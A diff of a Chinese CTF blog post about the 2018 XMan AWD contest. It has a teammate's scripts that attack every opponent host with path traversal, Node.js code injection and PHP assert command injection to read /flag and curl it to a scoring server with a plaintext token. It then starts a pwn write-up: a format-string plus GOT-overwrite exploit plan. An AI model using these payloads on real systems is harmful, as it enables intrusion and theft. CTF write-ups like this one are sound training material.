@@ -1,388 +1,752 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
+
+
+
+
 <head><meta name="generator" content="Hexo 3.8.0">
-  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>2018-XMan结营赛 | AssassinQ</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  
-  <meta name="keywords" content="ctfwp">
-  
-  
-  
-  
-  <meta name="description" content="记录一下被虐的经历。">
-<meta name="keywords" content="ctf,wp">
-<meta property="og:type" content="article">
-<meta property="og:title" content="2018-XMan结营赛">
-<meta property="og:url" content="blog.b3ale.cn/2018/08/22/2018-XMan结营赛/index.html">
-<meta property="og:site_name" content="AssassinQ">
-<meta property="og:description" content="记录一下被虐的经历。">
-<meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-08-26T01:15:23.740Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2018-XMan结营赛">
-<meta name="twitter:description" content="记录一下被虐的经历。">
-  
-    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
-  
-  <link rel="icon" href="/css/images/favicon.ico">
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
-  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
-  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
-  <style type="text/css">
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
-    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
-    
-  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <meta name="theme-color" content="#005f6b">
+  <meta name="description" content="ZJGSU-IS-17">
+  <meta name="author" content>
+  <meta name="keywords" content>
+  <title>2018-XMan结营赛 - AssassinQ</title>
 
-  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
-  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
-  <script src="/js/jquery-3.1.1.min.js"></script>
 
-  <!-- Bootstrap core CSS -->
-  <link rel="stylesheet" href="/css/bootstrap.css">
-  <link rel="stylesheet" href="/css/fashion.css">
-  <link rel="stylesheet" href="/css/glyphs.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
 
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
-</html>
 
 
-  <body data-spy="scroll" data-target="#toc" data-offset="50">
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>AssassinQ</strong>&nbsp;</a>
 
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-  
-  
-  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="site-header-image">
-    <img id="originBg" width="100%" alt="Hike News" src>
-  </div>
-
-  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
-    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
-  </div>
-
-  <script>
-        var imgUrls = "css/images/pose01.jpg".split(",");
-        var random = Math.floor((Math.random() * imgUrls.length ));
-        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
-          document.getElementById("originBg").src=imgUrls[random];
-          document.getElementById("blurBg").src=imgUrls[random];
-        } else {
-          document.getElementById("originBg").src='/' + imgUrls[random];
-          document.getElementById("blurBg").src='/' + imgUrls[random];
-        }
-    </script>
-
-
-
-
-<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
-  <div class="clearfix container">
-      <div class="site-branding">
-
-          <h1 class="site-title">
-            
-              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
-            
-          </h1>
-          
-          
-            <div class="site-description">ZJGSU-IS-17</div>
-          
-            
-          <nav id="main-navigation" class="main-navigation" role="navigation">
-            <a class="nav-open">Menu</a>
-            <a class="nav-close">Close</a>
-
-            <div class="clearfix sf-menu">
-              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
-                    
-                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
-                    
-              </ul>
-            </div>
-          </nav>
-
-      </div>
-  </div>
-</header>
-
-
-  <div id="container">
-    <div id="wrap">
-            
-      <div id="content" class="outer">
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <section id="main" style="float:none;"><article id="post-2018-XMan结营赛" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
         
-  
-    <h1 class="thumb" itemprop="name">
-      2018-XMan结营赛
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      	<a href="/2018/08/22/2018-XMan结营赛/" class="article-date">
-	  <time datetime="2018-08-22T09:39:54.000Z" itemprop="datePublished">August 22, 2018</time>
-	</a>
-
-       
-      
-
-	  |
-	  2k words
-	  |
-	  10 minute(s) to read
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">Links</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
-    <div class="article-entry" itemprop="articleBody">
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Wednesday, August 22nd 2018, 5:39 pm
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2.1k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      11 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
       
-        <p>记录一下被虐的经历。</p>
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>记录一下被虐的经历。</p>
 <a id="more"></a>
 <p>全队就我一个菜鸡维护二进制，全场被痛打，很难受。记录一下线下 AWD 所需要做的准备，以及两道 pwn 的复现。</p>
 <h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>第一次打 AWD，什么也不懂。</p>
 <ol>
 <li>比赛前了解比赛赛制、环境。</li>
 <li>服务器上线之后，第一时间改密码。</li>
-<li>下载好<code>FileZilla</code>、<code>Xshell</code>等连接服务器的工具，把服务器上给的文件备份。</li>
+<li>下载好 <code>FileZilla</code>、<code>Xshell</code> 等连接服务器的工具，把服务器上给的文件备份。</li>
 <li>提前准备好自动化的脚本。</li>
 </ol>
 <p>这里放一下队友 web 大佬的打全场脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">12</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    print(<span class="string">f"======<span class="subst">&#123;i+<span class="number">1</span>&#125;</span> starts======="</span>)</span><br><span class="line">    url = <span class="string">f"http://172.16.<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>.101:20001/uploads/images/../../../../../../../flag"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag = get(url).text[:<span class="number">-1</span>]</span><br><span class="line">        system(<span class="string">f'curl http://172.16.200.20:9000/submit_flag/ -d "flag=<span class="subst">&#123;flag&#125;</span>&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD"'</span>)</span><br><span class="line">        print(<span class="string">f"\n<span class="subst">&#123;flag&#125;</span>"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">f"<span class="subst">&#123;i+<span class="number">1</span>&#125;</span> : no"</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    url = <span class="string">f"http://172.16.<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>.101:20001/category/test?0=%28function%28%29%7b%0a%20%20%20%20var%20fs%20%3d%20require%28%27fs%27%29%3b%0a%09var%20flag%20%3d%20fs.readFileSync%28%27%2fflag%27%2c%20%27utf-8%27%29%3b%0a%09fs.writeFileSync%28%27%2fhome%2fxctf%2fweb%2fstatic%2fjs%2ftest.js%27%2c%20flag%29%3b%0a%09return%201%3b%0a%7d%29%28%29%3b"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        get(url)</span><br><span class="line">        url = <span class="string">f"http://172.16.<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>.101:20001/static/js/test.js"</span></span><br><span class="line">        flag = get(url).text</span><br><span class="line">        flag = get(url).text[:<span class="number">-1</span>]</span><br><span class="line">        system(<span class="string">f'curl http://172.16.200.20:9000/submit_flag/ -d "flag=<span class="subst">&#123;flag&#125;</span>&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD"'</span>)</span><br><span class="line">        print(<span class="string">f"\n<span class="subst">&#123;flag&#125;</span>"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    print(<span class="string">f"======<span class="subst">&#123;i+<span class="number">1</span>&#125;</span> starts======="</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">12</span> <span class="keyword">or</span> i == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    payloads = [</span><br><span class="line">        <span class="string">"@assert($_POST[cmd])"</span>,</span><br><span class="line">        <span class="string">"@assert($_POST[cmd])"</span>,</span><br><span class="line">        <span class="string">"@call_user_func(assert, $_POST[cmd])"</span>,</span><br><span class="line">        <span class="string">"print(file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103)))"</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payloads:</span><br><span class="line">        url = <span class="string">"http://172.16."</span> + str(i+<span class="number">1</span>) + <span class="string">".102:20002/?r=list&amp;pages=123&#123;$&#123;"</span> + p + <span class="string">"&#125;&#125;123"</span></span><br><span class="line">        t = post(url, data=&#123;<span class="string">'cmd'</span> : <span class="string">'system("/bin/cat /flag");'</span>&#125;).text</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            d = pq(t)</span><br><span class="line">            out = d(<span class="string">'.pagecode'</span>).html()</span><br><span class="line">            print(out)</span><br><span class="line">            flag = out.split(<span class="string">';'</span>)[<span class="number">-2</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> i==<span class="number">16</span>:</span><br><span class="line">                flag = flag[<span class="number">2</span>:]</span><br><span class="line">            print(<span class="string">f"<span class="subst">&#123;i+<span class="number">1</span>&#125;</span> : <span class="subst">&#123;flag&#125;</span>"</span>)</span><br><span class="line">            system(<span class="string">f'curl http://172.16.200.20:9000/submit_flag/ -d "flag=<span class="subst">&#123;flag&#125;</span>&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD"'</span>)</span><br><span class="line">            print(<span class="string">'\n'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">f"<span class="subst">&#123;i+<span class="number">1</span>&#125;</span> not avai"</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">from requests import get
+from os import system
+
+for i in range(24):
+    if i == 12:
+        continue
+    print(f&quot;======{i+1} starts=======&quot;)
+    url = f&quot;http://172.16.{i+1}.101:20001/uploads/images/../../../../../../../flag&quot;
+    try:
+        flag = get(url).text[:-1]
+        system(f&#39;curl http://172.16.200.20:9000/submit_flag/ -d &quot;flag={flag}&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD&quot;&#39;)
+        print(f&quot;\n{flag}&quot;)
+    except:
+        print(f&quot;{i+1} : no&quot;)
+        pass
+    url = f&quot;http://172.16.{i+1}.101:20001/category/test?0=%28function%28%29%7b%0a%20%20%20%20var%20fs%20%3d%20require%28%27fs%27%29%3b%0a%09var%20flag%20%3d%20fs.readFileSync%28%27%2fflag%27%2c%20%27utf-8%27%29%3b%0a%09fs.writeFileSync%28%27%2fhome%2fxctf%2fweb%2fstatic%2fjs%2ftest.js%27%2c%20flag%29%3b%0a%09return%201%3b%0a%7d%29%28%29%3b&quot;
+    try:
+        get(url)
+        url = f&quot;http://172.16.{i+1}.101:20001/static/js/test.js&quot;
+        flag = get(url).text
+        flag = get(url).text[:-1]
+        system(f&#39;curl http://172.16.200.20:9000/submit_flag/ -d &quot;flag={flag}&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD&quot;&#39;)
+        print(f&quot;\n{flag}&quot;)
+    except:
+        pass
+</code></pre>
+<pre><code class="python">from requests import post
+from pyquery import PyQuery as pq
+from os import system
+
+for i in range(24):
+    if i == 8:
+        continue
+    print(f&quot;======{i+1} starts=======&quot;)
+    if i == 12 or i == 2:
+        continue
+    payloads = [
+        &quot;@assert($_POST[cmd])&quot;,
+        &quot;@assert($_POST[cmd])&quot;,
+        &quot;@call_user_func(assert, $_POST[cmd])&quot;,
+        &quot;print(file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103)))&quot;
+    ]
+    for p in payloads:
+        url = &quot;http://172.16.&quot; + str(i+1) + &quot;.102:20002/?r=list&amp;pages=123{${&quot; + p + &quot;}}123&quot;
+        t = post(url, data={&#39;cmd&#39; : &#39;system(&quot;/bin/cat /flag&quot;);&#39;}).text
+        try:
+            d = pq(t)
+            out = d(&#39;.pagecode&#39;).html()
+            print(out)
+            flag = out.split(&#39;;&#39;)[-2].split(&#39;\n&#39;)[1]
+            if i==16:
+                flag = flag[2:]
+            print(f&quot;{i+1} : {flag}&quot;)
+            system(f&#39;curl http://172.16.200.20:9000/submit_flag/ -d &quot;flag={flag}&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD&quot;&#39;)
+            print(&#39;\n&#39;)
+        except:
+            print(f&quot;{i+1} not avai&quot;)
+            pass
+</code></pre>
 <h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>全场贡献只有成功 patch 了最容易的第二题。</p>
 <h2 id="once-time"><a href="#once-time" class="headerlink" title="once_time"></a>once_time</h2><p>checksec：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/home/assassinq/Desktop/once_time'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">[*] &#39;/home/assassinq/Desktop/once_time&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
 <p>拖进 ida，main 函数：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input your name: "</span>, a2);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">9u</span>LL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">9u</span>LL);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"wellcome :%s\n"</span>, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> vul();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="cpp">unsigned __int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  char s; // [rsp+0h] [rbp-20h]
+  char v5; // [rsp+8h] [rbp-18h]
+  unsigned __int64 v6; // [rsp+18h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  setbuf();
+  printf(&quot;input your name: &quot;, a2);
+  memset(&amp;s, 0, 9uLL);
+  read(0, &amp;s, 9uLL);
+  v5 = 0;
+  printf(&quot;wellcome :%s\n&quot;, &amp;s);
+  return vul();
+}
+</code></pre>
 <p>另一个关键函数：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"leave a msg: "</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(&amp;s, <span class="string">"%p"</span>) || <span class="built_in">strstr</span>(&amp;s, <span class="string">"$p"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"do you want to leak info?"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s, <span class="string">"$p"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>vul()</code>中<code>read(0, &amp;s, 0x20uLL);</code>处存在<code>buffer overflow</code>，又因为开了 Canary，需要想办法绕过；<code>printf(&amp;s, &quot;$p&quot;);</code>处存在<code>format string</code>，可以实现任意地址的读和写。</p>
+<pre><code class="cpp">unsigned __int64 vul()
+{
+  char s; // [rsp+0h] [rbp-20h]
+  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  printf(&quot;leave a msg: &quot;);
+  memset(&amp;s, 0, 0x10uLL);
+  read(0, &amp;s, 0x20uLL);
+  if ( strstr(&amp;s, &quot;%p&quot;) || strstr(&amp;s, &quot;$p&quot;) )
+  {
+    puts(&quot;do you want to leak info?&quot;);
+    exit(0);
+  }
+  printf(&amp;s, &quot;$p&quot;);
+  return __readfsqword(0x28u) ^ v2;
+}
+</code></pre>
+<p><code>vul()</code> 中 <code>read(0, &amp;s, 0x20uLL);</code> 处存在 <code>buffer overflow</code>，又因为开了 Canary，需要想办法绕过；<code>printf(&amp;s, &quot;$p&quot;);</code> 处存在 <code>format string</code>，可以实现任意地址的读和写。</p>
 <ol>
-<li>首先将<code>__stack_chk_fail</code>的 got 表改成 main 函数的地址，那么这样每次栈溢出报错的时候就会再一次执行 main 函数，从而实现多次输入，可以多次利用<code>printf(&amp;s，&quot;$p&quot;);</code>进行格式化字符串攻击；</li>
+<li>首先将 <code>__stack_chk_fail</code> 的 got 表改成 main 函数的地址，那么这样每次栈溢出报错的时候就会再一次执行 main 函数，从而实现多次输入，可以多次利用 <code>printf(&amp;s，&quot;$p&quot;);</code> 进行格式化字符串攻击；</li>
 <li>泄漏 libc 的基址，这里用泄漏 read 函数的真实地址来实现；</li>
-<li>将 one_gadget 写入 exit()函数的 got 表中。</li>
+<li>将 one_gadget 写入 <code>exit()</code> 函数的 got 表中。</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0008| 0x7fffffffdc10 (&quot;BBBBBBBB\n&quot;) ; 第二次输入</span><br><span class="line">0016| 0x7fffffffdc18 --&gt; 0xa (&apos;\n&apos;)</span><br><span class="line">0024| 0x7fffffffdc20 --&gt; 0x0</span><br><span class="line">0032| 0x7fffffffdc28 --&gt; 0x8e2d258951a85400</span><br><span class="line">0040| 0x7fffffffdc30 --&gt; 0x7fffffffdc60 --&gt; 0x400a20 (push   r15)</span><br><span class="line">0048| 0x7fffffffdc38 --&gt; 0x400a08 (mov    rcx,QWORD PTR [rbp-0x8])</span><br><span class="line">0056| 0x7fffffffdc40 (&quot;AAAAAAAA&quot;) ; 第一次输入</span><br></pre></td></tr></table></figure>
-<p>调试出来可以看到第一次输入位于第二次输入后的第六个参数，64 位下偏移就是 12。为了达到触发<code>__stack_chk_fail</code>的目的，我们还需要覆盖掉 Canary，位于第二次输入后的第三个参数处，故至少需要输入大于 24 个字符。read 总共读 0x20 个字符，我们这里也就读 0x20 个，以触发<code>__stack_chk_fail</code>。</p>
-<p>第二步利用<code>read</code>的 got 表将 libc 基址泄漏出来。然后在已知 libc 版本的情况下，第三步将<code>exit</code>的 got 表覆盖成 one_gadget。最后送个<code>%p</code>或者<code>$p</code>上去 getshell。exp 如下：</p>
